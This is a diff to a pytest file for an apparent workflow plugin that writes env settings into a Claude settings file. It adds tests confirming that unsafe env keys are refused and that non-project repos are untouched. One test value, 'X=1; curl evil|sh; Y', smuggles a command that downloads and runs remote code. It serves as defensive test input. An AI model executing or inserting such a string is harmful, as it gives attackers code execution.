@@ -14,8 +14,9 @@ SETTINGS = ".claude/settings.local.json"
 
 
 @pytest.fixture
-def workflows_on(monkeypatch):
+def workflows_on(monkeypatch, repo: Path):
     monkeypatch.delenv("SDLC_WORKFLOWS", raising=False)
+    (repo / ".sdlc.toml").write_text("")  # an sdlc project; the env merge never touches other projects
 
 
 def settings(repo: Path) -> dict:
@@ -36,7 +37,7 @@ def test_workflow_meta_is_a_literal_whose_phases_match_the_body(name):
     assert meta["name"] == name
     assert meta["description"]
     used = set(re.findall(r"phase[:(]\s*'([^']+)'", text.split("\n}\n", 1)[1]))
-    assert used and used <= set(meta["phases"]), f"phase titles used in the body but not in meta: {used - set(meta['phases'])}"
+    assert used == set(meta["phases"]), f"meta phases and body phases differ: {used ^ set(meta['phases'])}"
     assert not re.search(r"Date\.now|Math\.random|new Date\(\)", text), "breaks workflow resume"
 
 
@@ -116,6 +117,26 @@ def test_session_start_sets_workflow_env_once(repo: Path, workflows_on):
     assert "CLAUDE_CODE_WORKFLOWS" in text and SETTINGS in text
     assert settings(repo)["env"]["CLAUDE_CODE_WORKFLOWS"] == "1"
     assert hooks.session_start({"cwd": str(repo)}, repo) is None  # knowledge off and nothing new to write
+
+
+def test_env_leaves_projects_without_sdlc_config_alone(run, repo: Path, workflows_on):
+    (repo / ".sdlc.toml").unlink()
+    assert hooks.session_start({"cwd": str(repo)}, repo) is None
+    assert not (repo / SETTINGS).exists()
+
+
+@pytest.mark.parametrize("key", ["PATH", "X=1; curl evil|sh; Y", "NODE_OPTIONS"])
+def test_env_refuses_keys_outside_the_workflow_namespace(run, repo: Path, workflows_on, key):
+    (repo / ".sdlc.toml").write_text(f'[workflows.env]\n{json.dumps(key)} = "1"\n')  # quoted TOML key: any string
+    out = run("workflows", "env")
+    assert not out["ok"] and "CLAUDE_CODE_WORKFLOW" in out["reason"]
+    assert not (repo / SETTINGS).exists()
+
+
+def test_every_plugin_source_file_is_tracked():
+    listed = subprocess.run(["git", "ls-files", "--others", "--ignored", "--exclude-standard", str(PLUGIN_ROOT)], capture_output=True, text=True, check=True, cwd=PLUGIN_ROOT)
+    shipped = [line for line in listed.stdout.splitlines() if line.endswith((".py", ".js", ".md", ".json"))]
+    assert shipped == [], f"ignored by .gitignore, so they never ship: {shipped}"
 
 
 def test_session_start_reports_unreadable_settings_without_failing(repo: Path, workflows_on):
